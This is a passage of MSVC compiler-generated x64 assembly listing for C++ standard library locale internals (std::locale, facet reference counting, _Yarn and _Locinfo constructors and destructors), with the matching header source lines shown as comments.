	mov	rax, QWORD PTR _Ptr0$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	rcx, QWORD PTR _Id$[rsp]
	mov	rax, QWORD PTR [rax+rcx*8]
	jmp	SHORT $LN1@Getfacet
$LN4@Getfacet:

; 378  :         }
; 379  : 
; 380  :         return nullptr; // no entry in current locale

	xor	eax, eax
$LN1@Getfacet:

; 381  :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z ENDP	; std::locale::_Getfacet
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?c_str@locale@std@@QEBAPEBDXZ
_TEXT	SEGMENT
tv70 = 32
this$ = 64
?c_str@locale@std@@QEBAPEBDXZ PROC			; std::locale::c_str, COMDAT

; 364  :     _Ret_z_ const char* c_str() const {

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 365  :         return _Ptr ? _Ptr->_Name.c_str() : "";

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+8], 0
	je	SHORT $LN3@c_str
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	add	rax, 40					; 00000028H
	mov	rcx, rax
	call	?c_str@?$_Yarn@D@std@@QEBAPEBDXZ	; std::_Yarn<char>::c_str
	mov	QWORD PTR tv70[rsp], rax
	jmp	SHORT $LN4@c_str
$LN3@c_str:
	lea	rax, OFFSET FLAT:??_C@_00CNPNBAHC@@
	mov	QWORD PTR tv70[rsp], rax
$LN4@c_str:
	mov	rax, QWORD PTR tv70[rsp]

; 366  :     }

	add	rsp, 56					; 00000038H
	ret	0
?c_str@locale@std@@QEBAPEBDXZ ENDP			; std::locale::c_str
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??1locale@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 32
tv84 = 40
this$ = 64
??1locale@std@@QEAA@XZ PROC				; std::locale::~locale, COMDAT

; 345  :     ~locale() noexcept {

$LN6:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 346  :         if (_Ptr) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+8], 0
	je	SHORT $LN2@locale

; 347  :             delete _Ptr->_Decref();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	mov	rax, QWORD PTR [rax]
	call	QWORD PTR [rax+16]
	mov	QWORD PTR $T1[rsp], rax
	cmp	QWORD PTR $T1[rsp], 0
	je	SHORT $LN4@locale
	mov	rax, QWORD PTR $T1[rsp]
	mov	rax, QWORD PTR [rax]
	mov	edx, 1
	mov	rcx, QWORD PTR $T1[rsp]
	call	QWORD PTR [rax]
	mov	QWORD PTR tv84[rsp], rax
	jmp	SHORT $LN2@locale
$LN4@locale:
	mov	QWORD PTR tv84[rsp], 0
$LN2@locale:

; 348  :         }
; 349  :     }

	add	rsp, 56					; 00000038H
	ret	0
??1locale@std@@QEAA@XZ ENDP				; std::locale::~locale
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??0locale@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
_Right$ = 56
??0locale@std@@QEAA@AEBV01@@Z PROC			; std::locale::locale, COMDAT

; 262  :     locale(const locale& _Right) noexcept : _Ptr(_Right._Ptr) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	mov	QWORD PTR [rax+8], rcx

; 263  :         _Ptr->_Incref();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	mov	rax, QWORD PTR [rax]
	call	QWORD PTR [rax+8]

; 264  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0locale@std@@QEAA@AEBV01@@Z ENDP			; std::locale::locale
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gfacet@locale@std@@MEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gfacet@locale@std@@MEAAPEAXI@Z PROC			; std::locale::facet::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1facet@locale@std@@MEAA@XZ		; std::locale::facet::~facet
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 16
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gfacet@locale@std@@MEAAPEAXI@Z ENDP			; std::locale::facet::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??1facet@locale@std@@MEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1facet@locale@std@@MEAA@XZ PROC			; std::locale::facet::~facet, COMDAT

; 151  :         __CLR_OR_THIS_CALL ~facet() noexcept override {}

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7facet@locale@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rcx, QWORD PTR this$[rsp]
	call	??1_Facet_base@std@@UEAA@XZ		; std::_Facet_base::~_Facet_base
	add	rsp, 40					; 00000028H
	ret	0
??1facet@locale@std@@MEAA@XZ ENDP			; std::locale::facet::~facet
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??0facet@locale@std@@IEAA@_K@Z
_TEXT	SEGMENT
this$ = 48
_Initrefs$ = 56
??0facet@locale@std@@IEAA@_K@Z PROC			; std::locale::facet::facet, COMDAT

; 149  :         {}

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??0_Facet_base@std@@QEAA@XZ
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7facet@locale@std@@6B@
	mov	QWORD PTR [rax], rcx

; 148  :             : _Myrefs(static_cast<_Atomic_counter_t>(_Initrefs)) // non-atomic initialization

	mov	rax, QWORD PTR this$[rsp]
	mov	ecx, DWORD PTR _Initrefs$[rsp]
	mov	DWORD PTR [rax+8], ecx

; 149  :         {}

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0facet@locale@std@@IEAA@_K@Z ENDP			; std::locale::facet::facet
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ
_TEXT	SEGMENT
this$ = 8
?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ PROC ; std::locale::facet::_Decref, COMDAT

; 135  :         _Facet_base* __CLR_OR_THIS_CALL _Decref() noexcept override { // decrement use count

	mov	QWORD PTR [rsp+8], rcx

; 136  :             if (_MT_DECR(_Myrefs) == 0) {

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	ecx, -1
	lock xadd DWORD PTR [rax], ecx
	dec	ecx
	mov	eax, ecx
	test	eax, eax
	jne	SHORT $LN2@Decref

; 137  :                 return this;

	mov	rax, QWORD PTR this$[rsp]
	jmp	SHORT $LN1@Decref
$LN2@Decref:

; 138  :             }
; 139  : 
; 140  :             return nullptr;

	xor	eax, eax
$LN1@Decref:

; 141  :         }

	ret	0
?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ ENDP ; std::locale::facet::_Decref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Incref@facet@locale@std@@UEAAXXZ
_TEXT	SEGMENT
this$ = 8
?_Incref@facet@locale@std@@UEAAXXZ PROC			; std::locale::facet::_Incref, COMDAT

; 131  :         void __CLR_OR_THIS_CALL _Incref() noexcept override { // increment use count

	mov	QWORD PTR [rsp+8], rcx

; 132  :             _MT_INCR(_Myrefs);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	lock inc DWORD PTR [rax]

; 133  :         }

	ret	0
?_Incref@facet@locale@std@@UEAAXXZ ENDP			; std::locale::facet::_Incref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??Bid@locale@std@@QEAA_KXZ
_TEXT	SEGMENT
_Lock$1 = 32
this$ = 64
??Bid@locale@std@@QEAA_KXZ PROC				; std::locale::id::operator unsigned __int64, COMDAT

; 101  :         __CLR_OR_THIS_CALL operator size_t() { // get stamp, with lazy allocation

$LN6:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 102  :             if (_Id == 0) { // still zero, allocate stamp

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax], 0
	jne	SHORT $LN2@operator

; 103  :                 _BEGIN_LOCK(_LOCK_LOCALE)

	xor	edx, edx
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??0_Lockit@std@@QEAA@H@Z		; std::_Lockit::_Lockit

; 104  :                 if (_Id == 0) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax], 0
	jne	SHORT $LN3@operator

; 105  :                     _Id = static_cast<size_t>(++_Id_cnt);

	mov	eax, DWORD PTR ?_Id_cnt@id@locale@std@@0HA ; std::locale::id::_Id_cnt
	inc	eax
	mov	DWORD PTR ?_Id_cnt@id@locale@std@@0HA, eax ; std::locale::id::_Id_cnt
	movsxd	rax, DWORD PTR ?_Id_cnt@id@locale@std@@0HA ; std::locale::id::_Id_cnt
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx], rax
$LN3@operator:

; 106  :                 }
; 107  :                 _END_LOCK()

	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
$LN2@operator:

; 108  :             }
; 109  :             return _Id;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]

; 110  :         }

	add	rsp, 56					; 00000038H
	ret	0
??Bid@locale@std@@QEAA_KXZ ENDP				; std::locale::id::operator unsigned __int64
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??0id@locale@std@@QEAA@_K@Z
_TEXT	SEGMENT
this$ = 8
_Val$ = 16
??0id@locale@std@@QEAA@_K@Z PROC			; std::locale::id::id, COMDAT

; 96   :         __CLR_OR_THIS_CALL id(size_t _Val = 0) : _Id(_Val) {}

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Val$[rsp]
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0id@locale@std@@QEAA@_K@Z ENDP			; std::locale::id::id
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ?_Tidy@?$_Yarn@_W@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy@?$_Yarn@_W@std@@AEAAXXZ PROC			; std::_Yarn<wchar_t>::_Tidy, COMDAT

; 213  :     void __CLR_OR_THIS_CALL _Tidy() noexcept {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 214  :         if (_Myptr) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Tidy

; 215  : #ifdef _DEBUG
; 216  :             _free_dbg(_Myptr, _CRT_BLOCK);
; 217  : #else // _DEBUG
; 218  :             _CSTD free(_Myptr);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	free
$LN2@Tidy:

; 219  : #endif // _DEBUG
; 220  :         }
; 221  : 
; 222  :         _Myptr = nullptr;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0

; 223  :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Tidy@?$_Yarn@_W@std@@AEAAXXZ ENDP			; std::_Yarn<wchar_t>::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ??1?$_Yarn@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Yarn@_W@std@@QEAA@XZ PROC				; std::_Yarn<wchar_t>::~_Yarn<wchar_t>, COMDAT

; 192  :     __CLR_OR_THIS_CALL ~_Yarn() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 193  :         _Tidy();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy@?$_Yarn@_W@std@@AEAAXXZ		; std::_Yarn<wchar_t>::_Tidy

; 194  :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$_Yarn@_W@std@@QEAA@XZ ENDP				; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ??0?$_Yarn@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_Yarn@_W@std@@QEAA@XZ PROC				; std::_Yarn<wchar_t>::_Yarn<wchar_t>, COMDAT

; 151  :     __CLR_OR_THIS_CALL _Yarn() noexcept : _Myptr(nullptr), _Nul(0) {}

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0
	xor	eax, eax
	mov	rcx, QWORD PTR this$[rsp]
	mov	WORD PTR [rcx+8], ax
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$_Yarn@_W@std@@QEAA@XZ ENDP				; std::_Yarn<wchar_t>::_Yarn<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ?_Tidy@?$_Yarn@D@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy@?$_Yarn@D@std@@AEAAXXZ PROC			; std::_Yarn<char>::_Tidy, COMDAT

; 213  :     void __CLR_OR_THIS_CALL _Tidy() noexcept {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 214  :         if (_Myptr) {

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Tidy

; 215  : #ifdef _DEBUG
; 216  :             _free_dbg(_Myptr, _CRT_BLOCK);
; 217  : #else // _DEBUG
; 218  :             _CSTD free(_Myptr);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	free
$LN2@Tidy:

; 219  : #endif // _DEBUG
; 220  :         }
; 221  : 
; 222  :         _Myptr = nullptr;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0

; 223  :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Tidy@?$_Yarn@D@std@@AEAAXXZ ENDP			; std::_Yarn<char>::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ?c_str@?$_Yarn@D@std@@QEBAPEBDXZ
_TEXT	SEGMENT
tv68 = 0
this$ = 32
?c_str@?$_Yarn@D@std@@QEBAPEBDXZ PROC			; std::_Yarn<char>::c_str, COMDAT

; 200  :     _Ret_z_ const _Elem* __CLR_OR_THIS_CALL c_str() const noexcept {

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 201  :         return _Myptr ? _Myptr : &_Nul;

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN3@c_str
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR tv68[rsp], rax
	jmp	SHORT $LN4@c_str
$LN3@c_str:
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	QWORD PTR tv68[rsp], rax
$LN4@c_str:
	mov	rax, QWORD PTR tv68[rsp]

; 202  :     }

	add	rsp, 24
	ret	0
?c_str@?$_Yarn@D@std@@QEBAPEBDXZ ENDP			; std::_Yarn<char>::c_str
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ??1?$_Yarn@D@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Yarn@D@std@@QEAA@XZ PROC				; std::_Yarn<char>::~_Yarn<char>, COMDAT

; 192  :     __CLR_OR_THIS_CALL ~_Yarn() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 193  :         _Tidy();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy@?$_Yarn@D@std@@AEAAXXZ		; std::_Yarn<char>::_Tidy

; 194  :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$_Yarn@D@std@@QEAA@XZ ENDP				; std::_Yarn<char>::~_Yarn<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ??0?$_Yarn@D@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_Yarn@D@std@@QEAA@XZ PROC				; std::_Yarn<char>::_Yarn<char>, COMDAT

; 151  :     __CLR_OR_THIS_CALL _Yarn() noexcept : _Myptr(nullptr), _Nul(0) {}

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0
	mov	rax, QWORD PTR this$[rsp]
	mov	BYTE PTR [rax+8], 0
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$_Yarn@D@std@@QEAA@XZ ENDP				; std::_Yarn<char>::_Yarn<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ?_Gettrue@_Locinfo@std@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?_Gettrue@_Locinfo@std@@QEBAPEBDXZ PROC			; std::_Locinfo::_Gettrue, COMDAT

; 335  :     const char* __CLR_OR_THIS_CALL _Gettrue() const {

	mov	QWORD PTR [rsp+8], rcx

; 336  :         return "true";

	lea	rax, OFFSET FLAT:??_C@_04LOAJBDKD@true@

; 337  :     }

	ret	0
?_Gettrue@_Locinfo@std@@QEBAPEBDXZ ENDP			; std::_Locinfo::_Gettrue
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ?_Getfalse@_Locinfo@std@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?_Getfalse@_Locinfo@std@@QEBAPEBDXZ PROC		; std::_Locinfo::_Getfalse, COMDAT

; 331  :     const char* __CLR_OR_THIS_CALL _Getfalse() const {

	mov	QWORD PTR [rsp+8], rcx

; 332  :         return "false";

	lea	rax, OFFSET FLAT:??_C@_05LAPONLG@false@

; 333  :     }

	ret	0
?_Getfalse@_Locinfo@std@@QEBAPEBDXZ ENDP		; std::_Locinfo::_Getfalse
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ?_Getlconv@_Locinfo@std@@QEBAPEBUlconv@@XZ
_TEXT	SEGMENT
this$ = 48
?_Getlconv@_Locinfo@std@@QEBAPEBUlconv@@XZ PROC		; std::_Locinfo::_Getlconv, COMDAT

; 297  :     const lconv* __CLR_OR_THIS_CALL _Getlconv() const {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 298  :         return localeconv();

	call	localeconv

; 299  :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getlconv@_Locinfo@std@@QEBAPEBUlconv@@XZ ENDP		; std::_Locinfo::_Getlconv
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ
_TEXT	SEGMENT
$T1 = 32
$T2 = 80
__$ArrayPad$ = 128
this$ = 176
__$ReturnUdt$ = 184
?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ PROC		; std::_Locinfo::_Getcvt, COMDAT

; 293  :     _Cvtvec __CLR_OR_THIS_CALL _Getcvt() const {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 152				; 00000098H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 294  :         return ::_Getcvt();

	lea	rcx, QWORD PTR $T1[rsp]
	call	_Getcvt
	lea	rcx, QWORD PTR $T2[rsp]
	mov	rdi, rcx
	mov	rsi, rax
	mov	ecx, 44					; 0000002cH
	rep movsb
	lea	rax, QWORD PTR $T2[rsp]
	mov	rdi, QWORD PTR __$ReturnUdt$[rsp]
	mov	rsi, rax
	mov	ecx, 44					; 0000002cH
	rep movsb
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 295  :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 152				; 00000098H
	pop	rdi
	pop	rsi
	ret	0
?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ ENDP		; std::_Locinfo::_Getcvt
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ
_TEXT	SEGMENT
$T1 = 32
$T2 = 64
this$ = 128
__$ReturnUdt$ = 136
?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ PROC	; std::_Locinfo::_Getctype, COMDAT

; 289  :     _Ctypevec __CLR_OR_THIS_CALL _Getctype() const {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 104				; 00000068H

; 290  :         return ::_Getctype();

	lea	rcx, QWORD PTR $T2[rsp]
	call	_Getctype
	lea	rcx, QWORD PTR $T1[rsp]
	mov	rdi, rcx
	mov	rsi, rax
	mov	ecx, 32					; 00000020H
	rep movsb
	lea	rax, QWORD PTR $T1[rsp]
	mov	rdi, QWORD PTR __$ReturnUdt$[rsp]
	mov	rsi, rax
	mov	ecx, 32					; 00000020H
	rep movsb
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 291  :     }

	add	rsp, 104				; 00000068H
	pop	rdi
	pop	rsi
	ret	0
?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ ENDP	; std::_Locinfo::_Getctype
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ??1_Locinfo@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1_Locinfo@std@@QEAA@XZ PROC				; std::_Locinfo::~_Locinfo, COMDAT

; 269  :     __CLR_OR_THIS_CALL ~_Locinfo() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 270  :         _Locinfo_dtor(this);

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Locinfo_dtor@_Locinfo@std@@SAXPEAV12@@Z ; std::_Locinfo::_Locinfo_dtor

; 271  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 88					; 00000058H
	mov	rcx, rax
	call	??1?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::~_Yarn<char>
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 72					; 00000048H
	mov	rcx, rax
	call	??1?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::~_Yarn<char>
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 56					; 00000038H
	mov	rcx, rax
	call	??1?$_Yarn@_W@std@@QEAA@XZ		; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 40					; 00000028H
	mov	rcx, rax
	call	??1?$_Yarn@_W@std@@QEAA@XZ		; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 24
	mov	rcx, rax
	call	??1?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::~_Yarn<char>
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	rcx, rax
	call	??1?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::~_Yarn<char>
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	npad	1
	add	rsp, 40					; 00000028H
	ret	0
??1_Locinfo@std@@QEAA@XZ ENDP				; std::_Locinfo::~_Locinfo
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocinfo
;	COMDAT ??0_Locinfo@std@@QEAA@PEBD@Z
_TEXT	SEGMENT
this$ = 48
_Pch$ = 56
??0_Locinfo@std@@QEAA@PEBD@Z PROC			; std::_Locinfo::_Locinfo, COMDAT

; 246  :     {

$LN12:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 243  :         : _Lock(_LOCK_LOCALE)

	mov	rax, QWORD PTR this$[rsp]
	xor	edx, edx
	mov	rcx, rax
	call	??0_Lockit@std@@QEAA@H@Z		; std::_Lockit::_Lockit
	npad	1

; 246  :     {

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 8
	mov	rcx, rax
	call	??0?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::_Yarn<char>
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 24
	mov	rcx, rax
	call	??0?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::_Yarn<char>
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 40					; 00000028H
	mov	rcx, rax
	call	??0?$_Yarn@_W@std@@QEAA@XZ		; std::_Yarn<wchar_t>::_Yarn<wchar_t>
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 56					; 00000038H
	mov	rcx, rax
	call	??0?$_Yarn@_W@std@@QEAA@XZ		; std::_Yarn<wchar_t>::_Yarn<wchar_t>
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 72					; 00000048H
	mov	rcx, rax
	call	??0?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::_Yarn<char>
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 88					; 00000058H
	mov	rcx, rax
	call	??0?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::_Yarn<char>
	npad	1

; 247  :         if (_Pch) {

	cmp	QWORD PTR _Pch$[rsp], 0
	je	SHORT $LN2@Locinfo

; 248  :             _Locinfo_ctor(this, _Pch);

	mov	rdx, QWORD PTR _Pch$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Locinfo_ctor@_Locinfo@std@@SAXPEAV12@PEBD@Z ; std::_Locinfo::_Locinfo_ctor

; 249  :             return;

	jmp	SHORT $LN1@Locinfo
$LN2@Locinfo:

; 250  :         }
; 251  : 
; 252  :         _Xruntime_error("bad locale name");

